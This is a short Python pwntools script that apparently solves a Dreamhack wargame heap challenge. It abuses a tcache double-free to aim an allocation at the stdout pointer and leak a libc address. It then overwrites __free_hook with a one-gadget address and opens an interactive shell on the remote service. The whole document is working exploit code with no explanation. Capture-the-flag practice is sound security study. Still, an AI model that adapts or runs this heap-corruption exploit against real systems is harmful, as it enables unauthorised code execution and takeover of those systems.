from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 20389
r = remote(HOST, PORT)

def alloc(size, data):
    r.sendlineafter(b'Edit\n', b'1')
    r.sendlineafter(b'Size:' , str(size).encode())
    r.sendafter(b'Content: ', data)

def free():
    r.sendlineafter(b'Edit\n', b'2')

def print_chunk():
    r.sendlineafter(b'Edit\n', b'3')

def edit(data):
    r.sendlineafter(b'Edit\n', b'4')
    r.sendlineafter(b'chunk: ', data)

stdout = 0x601010

alloc(0x20, b'A')
free()
edit(b'a'*8)
free()
edit(p64(stdout))
alloc(0x20, b'A')
alloc(0x20, b'\x60')

print_chunk()
r.recvuntil(b': ')
libc = u64(r.recv(6).ljust(8, b'\x00')) - 0x3ec760
sh=libc+0x4f432
free_hook = libc+0x3ed8e8

alloc(0x30, b'A')
free()
edit(b'a'*8)
free()
edit(p64(free_hook))
alloc(0x30, b'A')
alloc(0x30, p64(sh))

free()

r.interactive()